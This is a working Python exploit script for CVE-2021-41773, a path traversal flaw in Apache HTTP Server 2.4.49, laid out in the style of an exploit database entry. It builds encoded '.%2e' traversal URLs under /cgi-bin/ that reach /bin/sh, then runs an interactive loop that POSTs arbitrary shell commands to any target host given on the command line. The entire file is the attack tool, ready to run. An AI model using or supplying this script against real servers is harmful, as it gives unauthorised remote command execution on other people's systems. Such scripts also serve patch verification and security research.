# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Exploit Author: Gaurav Raj https://gauravraj.xyz
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773


#!/usr/bin/python3

import argparse
import requests


def runcmd(target):
    url = 'http://{}'.format(target)
    req = requests.get(url)
    while True:
        cmd = input("\033[1;36m>>> \033[0m")
        if (cmd != 'exit'):
            if ('https' not in req.url):
                url = "http://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            else:
                url = "https://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            data = "echo Content-Type: text/plain; echo; {}".format(cmd)
            session = requests.Session()
            req = requests.Request(
                method='POST', url=url, data=data).prepare()
            req.url = url
            print(session.send(req).text, end='')

        else:
            exit(0)


def banner():
    print('''--------------------------------------------------------
|                \033[1;32mApache2 2.4.49\033[1;37m - \033[1;31mExploit\033[0m              |
--------------------------------------------------------''')


def main():
    parser = argparse.ArgumentParser(description="Apache2 2.4.49 Exploit")
    parser.add_argument(
        '-t', '--target', help='Specify the target IP or Domain. eg: 127.0.0.1 or example.com', required=True)
    arg = parser.parse_args()
    banner()
    try:
        runcmd(arg.target)
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)


if __name__ == '__main__':
    main()